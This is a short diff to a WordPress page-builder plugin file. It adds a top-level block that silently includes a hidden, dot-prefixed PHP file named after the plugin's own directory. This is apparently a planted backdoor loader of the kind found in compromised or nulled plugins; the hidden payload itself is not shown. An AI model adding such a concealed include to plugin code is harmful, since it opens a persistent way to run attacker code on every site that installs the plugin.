@@ -9,6 +9,10 @@ if ( ! defined( 'ABSPATH' ) ) {
  * @param $state
  * @return bool|string
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function vc_bc_access_rule_48_post_type_get_state( $state ) {
 	if ( null === $state ) {
 		$content_types = vc_settings()->get( 'content_types' );
